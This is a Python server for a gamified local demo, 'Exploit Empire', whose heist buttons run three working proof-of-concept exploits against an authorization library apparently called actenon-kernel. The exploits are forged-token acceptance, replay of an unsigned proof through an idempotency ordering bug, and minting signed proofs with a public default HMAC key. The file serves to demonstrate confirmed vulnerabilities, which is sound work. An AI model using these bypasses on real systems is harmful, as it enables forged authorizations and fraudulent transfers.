#!/usr/bin/env python3
"""
Exploit Empire — "Mafia vs Poliția" idle game whose coins come from the
REAL actenon-kernel vulnerabilities confirmed in REPORT.md, not from fake
random numbers. Every "heist" button in the frontend calls actual
actenon-kernel library code:

  1. "Lovitura la portofel"  -> actenon.boundary.BoundaryVerifier bypass
     (any 16+ char string accepted as a valid proof — CWE-306)
  2. "Furtul contractului"   -> ProtectedExecutor + IdempotencyStore
     ordering bug (idempotent replay returns success for an UNSIGNED
     PCCB, never calling proof_verifier.verify())
  3. "Lovitura cea mare"     -> the public default local HMAC secret
     (LOCAL_PROOF_SECRET in actenon/proof/signers/local.py) used to mint
     a fully, genuinely valid signed PCCB from scratch

"Poliția" = a detection heuristic modeled on defender_detect.py: heists
that use an unsigned/garbage token raise heat fast and can get busted;
the "big score" (cryptographically valid, just fraudulently authorized)
raises heat far more slowly, mirroring the real lesson from the report
that a shape-only heuristic cannot catch a properly-signed forgery.

Run:
    source /path/to/actenon-venv/bin/activate
    python3 empire_server.py --port 8950

Then open http://127.0.0.1:8950 in a browser.
"""

from __future__ import annotations

import argparse
import json
import random
import threading
import time
import warnings
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

warnings.filterwarnings("ignore", category=RuntimeWarning, module="actenon.*")

from actenon.boundary import BoundaryVerificationRequest, BoundaryVerifier
from actenon.credentials import InMemoryCredentialBroker
from actenon.execution.protected_executor import ProtectedExecutor
from actenon.idempotency import IdempotencyStore
from actenon.models import (
    ActionIntent,
    ActionSpec,
    AudienceRef,
    DynamicContextInput,
    PartyRef,
    PolicyDecision,
    TargetRef,
    TenantRef,
)
from actenon.models.runtime import ProtectedExecutionRequest
from actenon.proof import PCCBMinter, PCCBVerifier, VerifierDisclosureMode, build_local_proof_signer
from actenon.proof.signers.local import HmacSha256Signer, LOCAL_PROOF_KEY_ID, LOCAL_PROOF_SECRET
from actenon.replay import ReplayProtector, build_default_replay_store

import secrets as _secrets


STATE_PATH = Path(__file__).resolve().parent / "empire_state.json"
STATIC_HTML_PATH = Path(__file__).resolve().parent / "empire.html"

CLUBS = [
    {"id": "bar_il_corvo", "name": "Bar Il Corvo", "cost": 3000, "income_per_sec": 2},
    {"id": "biliard_omerta", "name": "Sala de Biliard Omerta", "cost": 12000, "income_per_sec": 9},
    {"id": "casino_neon", "name": "Cazinoul Neon", "cost": 60000, "income_per_sec": 45},
    {"id": "portul_umbrelor", "name": "Portul Umbrelor", "cost": 250000, "income_per_sec": 180},
    {"id": "turnul_de_sticla", "name": "Turnul de Sticla (spalatorie de bani)", "cost": 1_000_000, "income_per_sec": 700},
]

HEIST_INFO = {
    "wallet": {
        "name": "Lovitura la portofel",
        "technique": "BoundaryVerifier accepta orice sir de 16+ caractere ca proof valid (CWE-306)",
        "base_min": 300,
        "base_max": 900,
        "heat": 12,
    },
    "contract": {
        "name": "Furtul contractului",
        "technique": "ProtectedExecutor + IdempotencyStore verifica action_hash INAINTE de a apela proof_verifier.verify()",
        "base_min": 4000,
        "base_max": 4000,  # fixed — it's a literal replay of the same seeded contract
        "heat": 9,
    },
    "bigscore": {
        "name": "Lovitura cea mare",
        "technique": "cheia HMAC locala e publica in sursa (LOCAL_PROOF_SECRET) -> semnaturi 100% valide, fara nicio bresa de logica",
        "base_min": 8000,
        "base_max": 20000,
        "heat": 3,
        "min_level": 3,
    },
}


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _default_state() -> dict[str, Any]:
    return {
        "coins": 500,
        "attackers": 0,
        "weapon_level": 0,
        "training_level": 0,
        "heat": 0.0,
        "clubs_owned": [],
        "last_tick": _utc_now().isoformat(),
        "log": [],
        "busts": 0,
        "heists_done": 0,
    }


class Empire:
    """Server-authoritative game state, plus the three real exploit paths."""

    def __init__(self) -> None:
        # RLock: heist()/shop_*() acquire this and then call snapshot(),
        # which acquires it again on the same thread — a plain Lock would
        # deadlock there (and hang every subsequent /api/state request).
        self._lock = threading.RLock()
        self.state = self._load_state()

        # --- Heist 1 target: a live BoundaryVerifier, same as credit_service.py ---
        self._boundary_verifier = BoundaryVerifier()

        # --- Heist 2 target: a real ProtectedExecutor + IdempotencyStore, ---
        # --- with one legitimately signed operation seeded at startup.   ---
        self._executor_signer = build_local_proof_signer(secret=b"exploit-empire-victim-secret-v1")
        self._executor = ProtectedExecutor(
            proof_verifier=PCCBVerifier(self._executor_signer, disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG),
            credential_broker=InMemoryCredentialBroker(),
            replay_protector=ReplayProtector(build_default_replay_store()),
            idempotency_store=IdempotencyStore(),
        )
        self._seed_legit_contract()

        # --- Heist 3 target: a "victim bank" verifier using the PUBLIC ---
        # --- default local secret (nobody overrode ACTENON_LOCAL_HMAC_SECRET). ---
        self._victim_bank_signer = build_local_proof_signer()  # uses LOCAL_PROOF_SECRET, public
        self._victim_bank_verifier = PCCBVerifier(self._victim_bank_signer, disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG)

    # ---------------------------------------------------------------- state

    def _load_state(self) -> dict[str, Any]:
        if STATE_PATH.exists():
            try:
                return json.loads(STATE_PATH.read_text())
            except (ValueError, OSError):
                pass
        return _default_state()

    def _save_state(self) -> None:
        STATE_PATH.write_text(json.dumps(self.state, indent=2))

    def _log(self, message: str) -> None:
        self.state["log"].insert(0, {"t": _utc_now().strftime("%H:%M:%S"), "message": message})
        self.state["log"] = self.state["log"][:60]

    def _tick(self) -> None:
        """Advance passive club income and heat decay based on elapsed time."""
        now = _utc_now()
        last = datetime.fromisoformat(self.state["last_tick"])
        elapsed = max(0.0, (now - last).total_seconds())
        elapsed = min(elapsed, 3600)  # cap a single catch-up tick at 1h of income
        income_per_sec = sum(
            club["income_per_sec"] for club in CLUBS if club["id"] in self.state["clubs_owned"]
        )
        if income_per_sec:
            self.state["coins"] += income_per_sec * elapsed
        self.state["heat"] = max(0.0, self.state["heat"] - elapsed * 0.4)
        self.state["last_tick"] = now.isoformat()

    def _multiplier(self) -> float:
        m = 1.0
        m += 0.05 * min(self.state["attackers"], 40)
        m += 0.10 * self.state["weapon_level"]
        m += 0.07 * self.state["training_level"]
        return m

    def _bust_chance_reduction(self) -> float:
        r = 0.0
        r += 0.003 * min(self.state["attackers"], 40)
        r += 0.02 * self.state["weapon_level"]
        return min(r, 0.5)

    def _mafia_level(self) -> int:
        return 1 + self.state["attackers"] // 3 + self.state["weapon_level"]

    def snapshot(self) -> dict[str, Any]:
        with self._lock:
            self._tick()
            self._save_state()
            out = dict(self.state)
            out["mafia_level"] = self._mafia_level()
            out["multiplier"] = round(self._multiplier(), 2)
            out["clubs"] = [
                {**club, "owned": club["id"] in self.state["clubs_owned"]} for club in CLUBS
            ]
            out["heist_info"] = HEIST_INFO
            out["bust_chance_now"] = round(self._bust_chance(), 3)
            return out

    def _bust_chance(self) -> float:
        base = min(0.9, self.state["heat"] / 150.0)
        return max(0.0, base - self._bust_chance_reduction())

    # ------------------------------------------------------------ heist 1

    def _run_wallet_job(self) -> tuple[bool, str]:
        """Real call into actenon.boundary.BoundaryVerifier with a forged token."""
        forged_token = "forged-" + _secrets.token_hex(16)
        request = BoundaryVerificationRequest(
            proof_token=forged_token,
            action_type="wallet.credit",
            action_hash=_secrets.token_hex(32),
            audience="service:wallet",
            boundary_id="mafia-wallet-api",
        )
        result = self._boundary_verifier.verify_boundary(request)
        detail = f"token={forged_token[:20]}... -> valid={result.valid} (nicio semnatura verificata)"
        return result.valid, detail

    # ------------------------------------------------------------ heist 2

    def _seed_legit_contract(self) -> None:
        now = _utc_now()
        self._contract_operation_id = "contract_omerta_001"
        intent = ActionIntent(
            intent_id="intent_contract_omerta_001",
            issued_at=now,
            expires_at=now + timedelta(hours=1),
            tenant=TenantRef(tenant_id="victim-bank"),
            requester=PartyRef(type="agent", id="mafia-accountant"),
            action=ActionSpec(
                name="contract.payout",
                capability="contract.payout",
                parameters={"amount_minor": HEIST_INFO["contract"]["base_min"]},
            ),
            target=TargetRef(resource_type="contract", resource_id="contract-omerta"),
            metadata={"operation_id": self._contract_operation_id},
        )
        context = DynamicContextInput(
            request_id="req_contract_seed",
            audience=AudienceRef(type="service", id="victim-bank-endpoint"),
            scope_capabilities=("contract.payout",),
            now=now,
        )
        minter = PCCBMinter(signer=self._executor_signer, issuer=PartyRef(type="service", id="victim-bank-issuer"))
        decision = PolicyDecision(outcome="allow", summary="seed", rule_evaluations=(), reason_codes=("SEED",))
        pccb = minter.mint(intent, decision, context)
        request = ProtectedExecutionRequest(intent=intent, pccb=pccb, context=context)

        def handler(req: Any, cred: Any) -> dict[str, Any]:
            return {"result": "contract_paid", "amount_minor": HEIST_INFO["contract"]["base_min"]}

        result = self._executor.execute(request, handler)
        self._contract_intent = intent
        self._contract_context = context
        assert result.refusal is None, "seed contract execution must succeed"

    def _run_contract_heist(self) -> tuple[bool, str]:
        """Real call into ProtectedExecutor with an UNSIGNED PCCB reusing
        the seeded operation_id + action_hash. If this returns success
        without a refusal, proof_verifier.verify() was never invoked
        (confirmed in investigate_idempotency_order.py)."""
        from actenon.models.contracts import ActionHashSpec, PCCB, ScopeSpec, SignatureSpec
        from actenon.proof import build_action_hash_input, sha256_hex

        intent = self._contract_intent
        context = self._contract_context
        forged_pccb = PCCB(
            pccb_id=f"pccb_forged_{_secrets.token_hex(6)}",
            intent_id=intent.intent_id,
            issued_at=context.now,
            not_before=context.now,
            expires_at=intent.expires_at,
            issuer=PartyRef(type="service", id="victim-bank-issuer"),
            subject=intent.requester,
            tenant=intent.tenant,
            audience=context.audience,
            action=intent.action,
            target=intent.target,
            scope=ScopeSpec(mode="exact", capabilities=(intent.action.capability,), single_use=True),
            nonce=f"nonce-forged-{_secrets.token_hex(6)}",
            action_hash=ActionHashSpec(
                algorithm="sha-256",
                canonicalization="RFC8785-JCS",
                value=sha256_hex(build_action_hash_input(intent)),
            ),
            signature=SignatureSpec(
                algorithm=self._executor_signer.algorithm,
                key_id=self._executor_signer.key_id,
                encoding="base64url",
                value="pending",  # <-- never actually signed
            ),
        )
        request = ProtectedExecutionRequest(intent=intent, pccb=forged_pccb, context=context)

        def handler(req: Any, cred: Any) -> dict[str, Any]:
            # Should never run on a real re-verification; only runs if the
            # bug lets an unsigned PCCB through on a NON-idempotent path.
            return {"result": "contract_paid", "amount_minor": HEIST_INFO["contract"]["base_min"]}

        result = self._executor.execute(request, handler)
        detail = (
            f"replay operation_id={self._contract_operation_id}, "
            f"signature.value='pending' (nesemnat) -> refuzat={result.refusal is not None}"
        )
        return result.refusal is None, detail

    # ------------------------------------------------------------ heist 3

    def _run_big_score(self, amount_minor: int) -> tuple[bool, str]:
        """Real call: mint a fully valid PCCB using the PUBLIC default
        local HMAC secret (LOCAL_PROOF_SECRET), then verify it against
        the 'victim bank' verifier that also (mistakenly) uses that same
        public default secret in what should have been production."""
        now = _utc_now()
        intent = ActionIntent(
            intent_id=f"intent_bigscore_{_secrets.token_hex(6)}",
            issued_at=now,
            expires_at=now + timedelta(minutes=10),
            tenant=TenantRef(tenant_id="victim-bank"),
            requester=PartyRef(type="agent", id="mafia-ghost-account"),
            action=ActionSpec(name="wire.transfer", capability="wire.transfer", parameters={"amount_minor": amount_minor}),
            target=TargetRef(resource_type="account", resource_id="mafia-shell-account"),
        )
        context = DynamicContextInput(
            request_id=f"req_bigscore_{_secrets.token_hex(6)}",
            audience=AudienceRef(type="service", id="victim-bank-endpoint"),
            scope_capabilities=("wire.transfer",),
            now=now,
        )
        attacker_minter = PCCBMinter(
            # Built directly from the PUBLIC constant, not build_local_proof_signer()
            # (which would silently pick up ACTENON_LOCAL_HMAC_SECRET if the host
            # running this game happens to have it set). The whole point of this
            # heist is that the attacker only needs to have read the open-source
            # LOCAL_PROOF_SECRET value — nothing host- or environment-specific.
            signer=HmacSha256Signer(secret=LOCAL_PROOF_SECRET, key_id=LOCAL_PROOF_KEY_ID),
            issuer=PartyRef(type="service", id="victim-bank-issuer"),
        )
        decision = PolicyDecision(outcome="allow", summary="forged", rule_evaluations=(), reason_codes=("FORGED",))
        forged_pccb = attacker_minter.mint(intent, decision, context)

        try:
            self._victim_bank_verifier.verify(intent, forged_pccb, context)
            verified_ok = True
        except Exception:
            verified_ok = False

        detail = (
            f"semnat cu LOCAL_PROOF_SECRET={LOCAL_PROOF_SECRET!r} (public, din sursa) "
            f"-> verificat de banca-victima ca autentic={verified_ok}"
        )
        return verified_ok, detail

    # ------------------------------------------------------------ public API

    def heist(self, heist_type: str) -> dict[str, Any]:
        with self._lock:
            self._tick()
            info = HEIST_INFO.get(heist_type)
            if info is None:
                return {"ok": False, "message": "Tip de lovitura necunoscut."}
            if info.get("min_level") and self._mafia_level() < info["min_level"]:
                return {"ok": False, "message": f"Ai nevoie de nivel mafie {info['min_level']} pentru '{info['name']}'."}

            multiplier = self._multiplier()
            if heist_type == "wallet":
                success, detail = self._run_wallet_job()
                payout = random.randint(info["base_min"], info["base_max"]) * multiplier
            elif heist_type == "contract":
                success, detail = self._run_contract_heist()
                payout = info["base_min"] * multiplier
            elif heist_type == "bigscore":
                base_amount = random.randint(info["base_min"], info["base_max"])
                scaled_amount = int(base_amount * (1 + 0.2 * self._mafia_level()))
                success, detail = self._run_big_score(scaled_amount)
                payout = scaled_amount * 1.0  # already scaled; multiplier baked into amount
            else:
                success, detail, payout = False, "necunoscut", 0

            self.state["heists_done"] += 1
            busted = False
            message: str

            if not success:
                self._log(f"[{info['name']}] EȘUAT — {detail}")
                message = f"'{info['name']}' a eșuat tehnic (nu ar trebui să se întâmple pe acest kernel patch-uit)."
            else:
                self.state["heat"] += info["heat"]
                bust_chance = self._bust_chance()
                if random.random() < bust_chance:
                    busted = True
                    lost = self.state["coins"] * random.uniform(0.25, 0.5)
                    self.state["coins"] = max(0.0, self.state["coins"] - lost)
                    self.state["heat"] *= 0.3
                    self.state["busts"] += 1
                    message = (
                        f"POLIȚIA TE-A PRINS pe '{info['name']}'! Ai pierdut {lost:.0f} coins. "
                        f"({detail})"
                    )
                    self._log(message)
                else:
                    self.state["coins"] += payout
                    message = f"'{info['name']}' reușit: +{payout:.0f} coins. ({detail})"
                    self._log(message)

            self._save_state()
            out = self.snapshot()
            out["heist_result"] = {
                "ok": success,
                "busted": busted,
                "payout": round(payout, 0) if success and not busted else 0,
                "message": message,
                "technique": info["technique"],
            }
            return out

    def shop_recruit(self) -> dict[str, Any]:
        with self._lock:
            self._tick()
            cost = int(150 * (1.15 ** self.state["attackers"]))
            if self.state["coins"] < cost:
                return {**self.snapshot(), "error": f"Nu ai destui coins (cost {cost})."}
            self.state["coins"] -= cost
            self.state["attackers"] += 1
            self._log(f"Ai recrutat un nou membru al mafiei (total: {self.state['attackers']}), cost {cost}.")
            self._save_state()
            return self.snapshot()

    def shop_weapon(self) -> dict[str, Any]:
        with self._lock:
            self._tick()
            cost = int(2000 * (1.6 ** self.state["weapon_level"]))
            if self.state["coins"] < cost:
                return {**self.snapshot(), "error": f"Nu ai destui coins (cost {cost})."}
            self.state["coins"] -= cost
            self.state["weapon_level"] += 1
            self._log(f"Upgrade arme la nivel {self.state['weapon_level']}, cost {cost}.")
            self._save_state()
            return self.snapshot()

    def shop_train(self) -> dict[str, Any]:
        with self._lock:
            self._tick()
            cost = int(1200 * (1.5 ** self.state["training_level"]))
            if self.state["coins"] < cost:
                return {**self.snapshot(), "error": f"Nu ai destui coins (cost {cost})."}
            self.state["coins"] -= cost
            self.state["training_level"] += 1
            self._log(f"Antrenament finalizat, nivel {self.state['training_level']}, cost {cost}.")
            self._save_state()
            return self.snapshot()

    def shop_club(self, club_id: str) -> dict[str, Any]:
        with self._lock:
            self._tick()
            club = next((c for c in CLUBS if c["id"] == club_id), None)
            if club is None:
                return {**self.snapshot(), "error": "Club necunoscut."}
            if club_id in self.state["clubs_owned"]:
                return {**self.snapshot(), "error": "Ai deja acest club."}
            if self.state["coins"] < club["cost"]:
                return {**self.snapshot(), "error": f"Nu ai destui coins (cost {club['cost']})."}
            self.state["coins"] -= club["cost"]
            self.state["clubs_owned"].append(club_id)
            self._log(f"Ai cumparat '{club['name']}' (+{club['income_per_sec']} coins/sec), cost {club['cost']}.")
            self._save_state()
            return self.snapshot()

    def reset(self) -> dict[str, Any]:
        with self._lock:
            self.state = _default_state()
            self._save_state()
            return self.snapshot()


def _build_handler(empire: Empire) -> type[BaseHTTPRequestHandler]:
    class Handler(BaseHTTPRequestHandler):
        def _send_json(self, status: int, payload: dict[str, Any]) -> None:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _send_html(self) -> None:
            body = STATIC_HTML_PATH.read_bytes()
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            if parsed.path in ("/", "/index.html"):
                self._send_html()
                return
            if parsed.path == "/api/state":
                self._send_json(HTTPStatus.OK, empire.snapshot())
                return
            self._send_json(HTTPStatus.NOT_FOUND, {"ok": False})

        def do_POST(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            length = int(self.headers.get("Content-Length", "0"))
            raw = self.rfile.read(length) if length else b"{}"
            try:
                payload = json.loads(raw or b"{}")
            except ValueError:
                payload = {}

            if parsed.path == "/api/heist":
                out = empire.heist(str(payload.get("type", "")))
                self._send_json(HTTPStatus.OK, out)
                return
            if parsed.path == "/api/shop/recruit":
                self._send_json(HTTPStatus.OK, empire.shop_recruit())
                return
            if parsed.path == "/api/shop/weapon":
                self._send_json(HTTPStatus.OK, empire.shop_weapon())
                return
            if parsed.path == "/api/shop/train":
                self._send_json(HTTPStatus.OK, empire.shop_train())
                return
            if parsed.path == "/api/shop/club":
                self._send_json(HTTPStatus.OK, empire.shop_club(str(payload.get("club_id", ""))))
                return
            if parsed.path == "/api/reset":
                self._send_json(HTTPStatus.OK, empire.reset())
                return
            self._send_json(HTTPStatus.NOT_FOUND, {"ok": False})

        def log_message(self, format: str, *args: Any) -> None:
            return

    return Handler


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Empire — Mafia vs Politia, powered by real actenon-kernel bugs.")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8950)
    args = parser.parse_args()

    empire = Empire()
    server = ThreadingHTTPServer((args.host, args.port), _build_handler(empire))
    print(f"[empire] Exploit Empire running at http://{args.host}:{args.port}")
    print(f"[empire] State file: {STATE_PATH}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
